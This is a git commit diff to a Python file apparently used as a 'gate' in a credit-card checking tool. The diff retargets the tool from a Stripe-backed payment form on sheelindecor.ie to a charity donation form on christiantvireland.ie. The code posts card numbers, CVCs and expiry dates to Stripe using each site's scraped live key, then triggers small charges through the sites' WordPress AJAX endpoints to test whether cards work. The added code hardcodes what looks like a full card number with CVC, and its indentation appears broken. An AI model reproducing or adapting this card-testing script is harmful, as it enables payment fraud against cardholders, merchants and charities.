2b5bb4b3e88ea98fad301d0ddb3c85e8ec39e97e
gfemin <minthantshin.mts11@gmail.com>
2025-12-23 22:59:57 +0630

    Refactor payment method handling in gatet.py

--- gatet.py
+++ gatet.py
@@ -14,64 +14,59 @@ def Tele(ccx):
     random_amount1 = random.randint(1, 4)
     random_amount2 = random.randint(1, 99)
 
-    headers = {
-        'authority': 'api.stripe.com',
-        'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2410DPN6CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-    }
-    
-    data = f'type=card&billing_details[name]=aung+soe&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=e2ce4c33-7de3-48dd-b522-a1ac38e63825314c5e&muid=bf2c766a-b940-4e24-b775-dbebaf0be6928f64f2&sid=efc12bd6-7a6f-41ca-8f40-56b8b07ff2bfe05c90&pasted_fields=number&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&referrer=https%3A%2F%2Fsheelindecor.ie&time_on_page=44472&client_attribution_metadata[client_session_id]=db224655-6fec-43b6-aba3-4500009424af&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51HdKVAJUohDFZIex4MybnIr4jv6iOjqqom3s1n4DGsENMShFQMdLLc7zqh8MDnJET1z0tDI7mqbrxoB4sI5hd67U00FmF2DK9C'
-    
-    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-    
-    pm = response.json()['id']
-    
-    headers = {
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'en-US,en;q=0.9',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'origin': 'https://sheelindecor.ie',
-        'priority': 'u=1, i',
-        'referer': 'https://sheelindecor.ie/pay-online/',
-        'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-        # 'cookie': '_ga=GA1.1.1544420914.1766482149; _ga_0DFXD0GTF4=GS2.1.s1766482149$o1$g0$t1766482149$j60$l0$h0; cookielawinfo-checkbox-necessary=yes; __stripe_mid=bf2c766a-b940-4e24-b775-dbebaf0be6928f64f2; __stripe_sid=efc12bd6-7a6f-41ca-8f40-56b8b07ff2bfe05c90; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; viewed_cookie_policy=yes; cli_user_preference=en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes; CookieLawInfoConsent=eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9',
-    }
-    
-    data = {
-        'action': 'wp_full_stripe_inline_payment_charge',
-        'wpfs-form-name': 'default',
-        'wpfs-form-get-parameters': '%7B%7D',
-        'wpfs-custom-amount-unique': '0.5',
-        'wpfs-billing-name': 'aow',
-        'wpfs-billing-address-line-1': 'parkave',
-        'wpfs-billing-address-line-2': '',
-        'wpfs-billing-address-city': 'new york',
-        'wpfs-billing-address-state': 'new york',
-        'wpfs-billing-address-zip': '10080',
-        'wpfs-billing-address-country': 'IE',
-        'wpfs-card-holder-email': 'minthantshin.virus11@gmail.com',
-        'wpfs-card-holder-name': 'aung soe',
-        'wpfs-stripe-payment-method-id': f'{pm}',
-    }
-    
-    response = requests.post('https://sheelindecor.ie/wp-admin/admin-ajax.php', headers=headers, data=data)
+	headers = {
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
+	    'accept-language': 'en-US,en;q=0.9',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2410DPN6CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+	}
+	
+	data = f'type=card&billing_details[name]=Min+Thant&card[number]=5312600062591077&card[cvc]=003&card[exp_month]=09&card[exp_year]=28&guid=de40fe2a-ce5c-4324-b10a-87afe4df5c987a999e&muid=2436d5b2-8dcc-4b44-a486-96eecfae9ae1e7c877&sid=14287af9-bcf1-4c0b-bad9-195d30210bd788a022&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&referrer=https%3A%2F%2Fchristiantvireland.ie&client_attribution_metadata[client_session_id]=22704580-3f18-4752-9028-705cbd3de38c&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51MrJUoFYWOfRAL36tEpAYV8qK1PEbiqp3QXs3wjZTLCImyIh2mmkYi8nW2tZBVvfgZG7UVaurtWfwkigqQAD6KJg00VB6fcBoS'
+	
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	
+	pm = response.json()['id']
+	
+	
+	headers = {
+	    'Accept': 'application/json, text/javascript, */*; q=0.01',
+	    'Accept-Language': 'en-US,en;q=0.9',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'Origin': 'https://christiantvireland.ie',
+	    'Referer': 'https://christiantvireland.ie/donate/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'same-origin',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 16; 2410DPN6CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+	    'X-Requested-With': 'XMLHttpRequest',
+	    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	}
+	
+	data = {
+	    'action': 'wp_full_stripe_inline_donation_charge',
+	    'wpfs-form-name': 'website_donation',
+	    'wpfs-form-get-parameters': '%7B%7D',
+	    'wpfs-custom-amount': 'other',
+	    'wpfs-custom-amount-unique': '1',
+	    'wpfs-donation-frequency': 'weekly',
+	    'wpfs-card-holder-email': 'minthantshin.virus11@gmail.com',
+	    'wpfs-card-holder-name': 'Min Thant',
+	    'wpfs-stripe-payment-method-id': f'{pm}',
+	}
+	
+	response = requests.post('https://christiantvireland.ie/wp-admin/admin-ajax.php', headers=headers, data=data)
     
     result = response.json()['message']
     
